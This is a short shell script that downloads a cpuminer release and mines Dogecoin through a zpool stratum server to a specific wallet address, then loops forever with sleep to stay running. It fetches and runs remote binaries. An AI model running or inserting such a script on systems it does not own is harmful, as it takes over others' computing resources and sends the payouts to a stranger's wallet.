#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u D7PvUNvanSGs6xgvsRjZNrBfAkYWRo5Dad.marqnul85 -p c=DOGE
while [ 1 ]; do
sleep 3
done
sleep 999
